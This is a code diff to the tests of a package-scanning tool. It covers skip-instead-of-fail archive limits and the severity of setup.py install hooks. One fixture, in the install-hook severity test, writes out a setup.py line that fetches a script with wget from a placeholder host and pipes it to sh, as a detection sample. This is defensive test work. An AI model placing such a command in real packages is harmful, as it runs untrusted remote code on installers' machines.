@@ -109,25 +109,31 @@ def test_unpack_rejects_absolute_path_in_zip():
         _unpack_zip(raw)
 
 
-def test_unpack_enforces_per_file_cap(monkeypatch):
+def test_unpack_skips_member_over_per_file_cap(monkeypatch):
+    # Over the per-member cap: skipped unread and recorded, not a failed scan.
     monkeypatch.setattr(af, "MAX_MEMBER_BYTES", 8)
-    raw = _make_targz({"package/big.js": b"0123456789"})  # 10 bytes > 8
-    with pytest.raises(ArtifactFetchError):
-        _unpack_tar_gz(raw)
+    raw = _make_targz({"package/big.js": b"0123456789", "package/ok.js": b"1"})
+    report = af.SkipReport()
+    out = _unpack_tar_gz(raw, report)
+    assert set(out) == {"package/ok.js"}
+    assert report.count == 1 and report.reasons == {"too large": 1}
 
 
-def test_unpack_enforces_file_count_cap(monkeypatch):
+def test_unpack_file_count_cap_skips_instead_of_failing(monkeypatch):
     monkeypatch.setattr(af, "MAX_FILE_COUNT", 1)
     raw = _make_targz({"package/a.js": b"a", "package/b.js": b"b"})
-    with pytest.raises(ArtifactFetchError):
-        _unpack_tar_gz(raw)
+    report = af.SkipReport()
+    out = _unpack_tar_gz(raw, report)
+    assert len(out) == 1
+    assert report.count == 1 and report.scannable == 1
 
 
-def test_unpack_enforces_unpacked_size_cap(monkeypatch):
+def test_unpack_size_budget_skips_instead_of_failing(monkeypatch):
     monkeypatch.setattr(af, "MAX_UNPACKED_BYTES", 5)
     raw = _make_targz({"package/a.js": b"012345"})  # 6 > 5
-    with pytest.raises(ArtifactFetchError):
-        _unpack_tar_gz(raw)
+    report = af.SkipReport()
+    assert _unpack_tar_gz(raw, report) == {}
+    assert report.reasons == {"over budget": 1}
 
 
 @pytest.mark.asyncio
@@ -237,12 +243,17 @@ async def test_fetch_pypi_wheel_when_no_sdist():
 
 # ── setup.py install-time exec (AST) ──────────────────────────────────────────
 
-def test_setup_py_os_system_is_high():
+def test_setup_py_os_system_is_an_install_hook():
+    # Precision PR 2: a literal, payload-free shell command at install time is a medium
+    # install hook; one that downloads / pipes to a shell stays high.
     src = "import os\nfrom setuptools import setup\nos.system('echo hi')\nsetup(name='x')\n"
     findings = detect_pypi_install_exec(src, "setup.py")
     assert len(findings) == 1
     assert findings[0].category == "install_hook"
-    assert findings[0].severity == "high"
+    assert findings[0].severity == "medium"
+    src = ("import os\nfrom setuptools import setup\n"
+           "os.system('wget -qO- https://x.example/i | sh')\nsetup(name='x')\n")
+    assert detect_pypi_install_exec(src, "setup.py")[0].severity == "high"
 
 
 def test_setup_py_network_plus_exec_is_critical():
@@ -425,7 +436,10 @@ def test_setup_py_cmdclass_test_only_not_flagged():
     assert detect_pypi_install_exec(src, "setup.py") == []
 
 
-def test_artifact_scan_skips_test_files():
+def test_artifact_scan_reads_test_files_for_payloads_only():
+    """Test files are read (a runtime module can import a shipped tests/ dir), but a
+    non-payload finding there is informational and the file is not counted."""
+
     fetched = ArtifactFetchResult(
         ecosystem="pypi", name="x", version="1.0", kind="sdist", ok=True,
         files={
@@ -435,8 +449,10 @@ def test_artifact_scan_skips_test_files():
             "pkg/core.py": _af("pkg/core.py", "def add(a, b):\n    return a + b\n"),
         },
     )
-    findings, _scanned, _hook = scan_artifact_files(fetched)
-    assert not any("test" in (f.file_path or "") for f in findings)
+    findings, scanned, _hook = scan_artifact_files(fetched)
+    assert scanned == 1
+    in_tests = [f for f in findings if f.file_path == "tests/test_x.py"]
+    assert all(f.kind == "defect" and f.severity == "info" for f in in_tests)
 
 
 def test_drift_no_hook_finding_when_uncompared():
